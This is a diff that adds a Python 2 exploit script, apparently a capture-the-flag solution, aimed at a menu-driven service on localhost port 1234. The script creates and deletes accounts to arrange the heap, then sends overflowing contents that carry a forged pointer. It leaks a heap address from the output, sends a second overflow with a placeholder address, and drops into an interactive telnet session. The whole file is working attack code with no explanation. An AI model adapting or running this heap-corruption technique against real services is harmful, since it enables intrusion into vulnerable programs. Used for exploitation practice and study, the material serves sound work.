@@ -1,0 +1,111 @@
+import socket
+import struct
+import telnetlib
+from hexdump import* 
+def recv_until(s,string):
+	r = ""
+	while not r.endswith(string):
+		tmp = s.recv(1)
+		if not tmp:break
+		r += tmp
+	return r
+def make_trash(s,string):
+	recv_until(s,'$')
+	s.send('2\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+	recv_until(s,':')
+	s.send(string+'\n')
+s = socket.create_connection(['0',1234])
+
+debug = raw_input('')
+
+make_trash(s,'user1')
+make_trash(s,'user2')
+recv_until(s,'$')
+s.send('1\n')
+recv_until(s,':')
+s.send('user1\n')
+recv_until(s,':')
+s.send('user1\n')
+recv_until(s,'$')
+s.send('3\n')
+recv_until(s,'$')
+s.send('1\n')
+recv_until(s,':')
+s.send('user2\n')
+recv_until(s,':')
+s.send('user2\n')
+recv_until(s,'$')
+s.send('2\n')
+recv_until(s,'(Yes / No)')
+s.send('yes\n')
+recv_until(s,':')
+s.send(str(0x110+1)+'\n')
+recv_until(s,'contents')
+dat = ""
+dat += struct.pack('<Q',0x4027F0)
+dat += "user1"
+dat += "\x00"*(11)
+dat += "user1"
+dat += "\x00"*(48-5)
+dat += "A"*(0x88-len(dat))
+s.send(dat)
+recv_until(s,'Hello')
+s.send('1\n')
+recv_until(s,'Hello')
+s.send('4\n')
+make_trash(s,'user1')
+recv_until(s,'$')
+s.send('1\n')
+recv_until(s,':')
+s.send('user1\n')
+recv_until(s,':')
+s.send('user1\n')
+recv_until(s,'$')
+s.send('1\n')
+heap1 = struct.unpack('<Q',recv_until(s,'Phone')[-9:-6]+"\x00"*5)[0]
+print "[ heap1 : %s]"%hex(heap1)
+make_trash(s,'user3')
+make_trash(s,'user4')
+recv_until(s,'$')
+s.send('1\n')
+recv_until(s,':')
+s.send('user3\n')
+recv_until(s,':')
+s.send('user3\n')
+recv_until(s,'$')
+s.send('3\n')
+recv_until(s,'$')
+s.send('1\n')
+recv_until(s,':')
+s.send('user4\n')
+recv_until(s,':')
+s.send('user4\n')
+recv_until(s,'$')
+s.send('2\n')
+recv_until(s,'(Yes / No)')
+s.send('yes\n')
+recv_until(s,':')
+s.send(str(0x110+1)+'\n')
+recv_until(s,'contents')
+dat = ""
+dat += struct.pack('<Q',0x42424242)
+dat += "user1"
+dat += "\x00"*(11)
+dat += "user1"
+dat += "\x00"*(48-5)
+dat += "A"*(0x88-len(dat))
+s.send(dat)
+print "[interact]"
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
